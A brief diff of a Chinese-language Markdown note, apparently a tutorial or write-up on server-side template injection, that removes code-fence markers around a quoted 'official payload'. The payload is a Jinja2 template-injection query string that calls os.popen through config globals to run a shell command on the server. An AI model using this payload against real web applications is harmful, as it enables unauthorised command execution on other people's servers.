@@ -58,12 +58,11 @@ P3's girlfirend is : foo
 
 5. 贴一个官方的Payload：
 
-    ```
+    
     ?name={{ config.class.init.globals['os'].popen('ls /').read() }}
-    ```
+    
 
 {% endraw %}
-```
 
 ----
 
